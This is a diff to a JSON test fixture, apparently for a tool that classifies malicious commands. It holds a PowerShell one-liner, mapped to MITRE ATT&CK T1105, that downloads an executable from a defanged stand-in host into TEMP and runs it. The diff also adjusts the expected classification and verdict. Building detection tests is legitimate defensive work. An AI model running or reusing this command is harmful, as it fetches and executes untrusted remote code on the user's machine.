@@ -133,9 +133,10 @@
     "source": "MITRE ATT&CK T1105 ; Red Canary Threat Detection Report 2023",
     "command": "Invoke-WebRequest -Uri hxxp://cdn.pkg-delivery[.]xyz/agent.exe -OutFile $env:TEMP\\agent.exe; & $env:TEMP\\agent.exe",
     "expect": {
-      "classes": ["dropper", "defense_evasion"],
+      "classes": ["dropper"],
       "min_confidence": {"dropper": "high"},
-      "techniques": ["T1105"]
+      "techniques": ["T1105"],
+      "verdict": "malicious"
     },
     "reject": {"classes": ["impact", "credential_theft"]}
   },
